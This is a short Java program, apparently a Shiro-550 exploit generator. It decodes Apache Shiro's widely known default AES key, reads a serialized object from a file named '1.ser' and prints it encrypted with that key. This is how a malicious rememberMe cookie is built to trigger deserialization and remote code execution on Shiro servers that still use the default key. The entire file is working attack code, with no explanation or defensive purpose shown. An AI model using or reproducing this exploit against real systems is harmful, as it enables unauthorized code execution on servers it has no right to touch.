import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;

public class shiro550 {
    public static void main(String[] args) throws IOException {
        byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

        AesCipherService aesCipherService = new AesCipherService();
        byte[] evilObj = getSerializedObj();

        ByteSource finalsource = aesCipherService.encrypt(evilObj, DEFAULT_CIPHER_KEY_BYTES);
        System.out.println(finalsource.toString());

    }
    public static byte[] getSerializedObj() throws IOException {

        int n;
        FileInputStream fileInputStream = new FileInputStream("1.ser");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        while((n=fileInputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        return byteArrayOutputStream.toByteArray();

    }
}
